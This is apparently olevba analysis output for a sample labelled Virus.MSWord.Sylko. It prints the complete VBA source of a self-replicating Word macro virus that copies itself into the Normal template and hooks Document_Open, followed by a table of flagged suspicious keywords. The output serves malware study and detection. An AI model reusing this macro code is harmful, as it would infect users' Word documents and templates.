olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Sylko
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Sylko - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub HookWorm()
Dim Target As Object
Options.VirusProtection = Yes
Options.SaveNormalPrompt = Yes
Options.ConfirmConversions = Yes
If ThisDocument = NormalTemplate Then Set Target = ActiveDocument Else Set Target = NormalTemplate
For X = 1 To ThisDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If UCase(ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(X, 1)) = "PRIVATE SUB HOOKWORM()" Then
HW = ThisDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(X, 27)
GoTo Continue
End If
Next
Continue:
For Y = 1 To Target.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If UCase(Target.VBProject.VBComponents.Item(1).CodeModule.Lines(Y, 1)) = "PRIVATE SUB HOOKWORM()" Then GoTo Finish
Next
For Z = 1 To Target.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
If UCase(Target.VBProject.VBComponents.Item(1).CodeModule.Lines(Z, 1)) = "PRIVATE SUB DOCUMENT_OPEN()" Then
Target.VBProject.VBComponents.Item(1).CodeModule.InsertLines Z + 1, "Call HookWorm"
Target.VBProject.VBComponents.Item(1).CodeModule.AddFromString HW
GoTo Finish
End If
Next
Target.VBProject.VBComponents.Item(1).CodeModule.InsertLines Target.VBProject.VBComponents.Item(1).CodeModule.CountOfLines + 1, "Private Sub Document_Open()" & Chr(13) & Chr(10) & "Call HookWorm" & Chr(13) & Chr(10) & "End Sub"
Target.VBProject.VBComponents.Item(1).CodeModule.AddFromString HW
Finish:
End Sub 'HookWorm By Lys Kovick
Private Sub Document_Open()
Call HookWorm
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |DOCUMENT_OPEN       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

